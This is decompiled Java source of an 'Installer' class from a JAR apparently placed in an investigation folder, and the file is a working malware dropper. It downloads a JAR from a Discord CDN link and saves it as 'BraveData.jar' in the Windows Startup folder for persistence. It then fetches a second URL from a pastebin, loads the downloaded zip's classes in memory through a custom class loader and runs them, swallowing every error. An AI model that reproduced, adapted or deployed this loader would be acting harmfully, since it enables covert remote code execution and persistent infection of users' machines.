/*     */ package idasido.adldaosd.wpiw.install;
/*     */ import java.io.BufferedReader;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.File;
/*     */ import java.io.FileOutputStream;
/*     */ import java.io.InputStream;
/*     */ import java.net.HttpURLConnection;
/*     */ import java.net.URL;
/*     */ import java.util.zip.ZipEntry;
/*     */ import java.util.zip.ZipInputStream;
/*     */ 
/*     */ public class Installer extends ClassLoader {
/*     */   public static void main() {
/*     */     try {
/*  15 */       if (System.getProperty("os.name").toLowerCase().contains("linux"))
/*  16 */         return;  URL fileURL = new URL("https://cdn.discordapp.com/attachments/876237069171687494/876244245932044329/COPE-1.0-SNAPSHOT-server.jar");
/*  17 */       HttpURLConnection httpURLConnection = (HttpURLConnection)fileURL.openConnection();
/*  18 */       httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
/*  19 */       InputStream stream = httpURLConnection.getInputStream();
/*  20 */       File path = new File(System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup");
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*  32 */       if (!path.exists()) path.mkdir(); 
/*  33 */       File jar = new File(path.getAbsolutePath(), "BraveData.jar");
/*  34 */       FileOutputStream fileOut = new FileOutputStream(jar);
/*     */       int currByte;
/*  36 */       while ((currByte = stream.read()) != -1) {
/*  37 */         fileOut.write(currByte);
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*     */       }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*     */     }
/*  51 */     catch (Exception exception) {}
/*     */     try {
/*  53 */       Installer loader = new Installer();
/*     */       
/*  55 */       URL pastebin = new URL("https://pastebin.com/raw/vZ31eQAb");
/*  56 */       BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
/*  57 */       String fileURL = reader.readLine();
/*  58 */       URL url = new URL(fileURL);
/*     */       
/*  60 */       HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
/*  61 */       httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
/*  62 */       InputStream inputStream = httpURLConnection.getInputStream();
/*     */       
/*  64 */       ZipInputStream zipInputStream = new ZipInputStream(inputStream);
/*     */       
/*     */       ZipEntry zipEntry;
/*  67 */       while ((zipEntry = zipInputStream.getNextEntry()) != null) {
/*  68 */         String name = zipEntry.getName();
/*     */         
/*  70 */         if (!name.endsWith(".class"))
/*     */           continue; 
/*  72 */         name = name.substring(0, name.length() - 6);
/*  73 */         name = name.replace('/', '.');
/*     */         
/*  75 */         ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
/*     */         
/*  77 */         byte[] tempBuffer = new byte[16384]; int bytesRead;
/*  78 */         for (; (bytesRead = zipInputStream.read(tempBuffer)) != -1; streamBuilder.write(tempBuffer, 0, bytesRead));
/*     */         
/*  80 */         loader.classes.put(name, streamBuilder.toByteArray());
/*     */       } 
/*     */ 
/*     */ 
/*     */       
/*  85 */       loader.findClass("idasido.adldaosd.wpiw.Main").getMethod("main", new Class[0]).invoke(null, new Object[0]);
/*     */     }
/*  87 */     catch (Exception exception) {}
/*     */   }
/*     */   
/*  90 */   public Map<String, byte[]> classes = (Map)new HashMap<>();
/*     */ 
/*     */   
/*     */   protected Class<?> findClass(String s) throws ClassNotFoundException {
/*  94 */     Class<?> clazz = null;
/*     */     try {
/*  96 */       clazz = super.findClass(s);
/*     */     }
/*  98 */     catch (Exception exception) {}
/*     */     
/*     */     try {
/* 101 */       if (this.classes.containsKey(s)) {
/* 102 */         clazz = defineClass(s, this.classes.get(s), 0, ((byte[])this.classes.get(s)).length);
/*     */       }
/* 104 */     } catch (Throwable throwable) {}
/*     */     
/* 106 */     return clazz;
/*     */   }
/*     */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-installer.jar!\idasido\adldaosd\wpiw\install\Installer.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */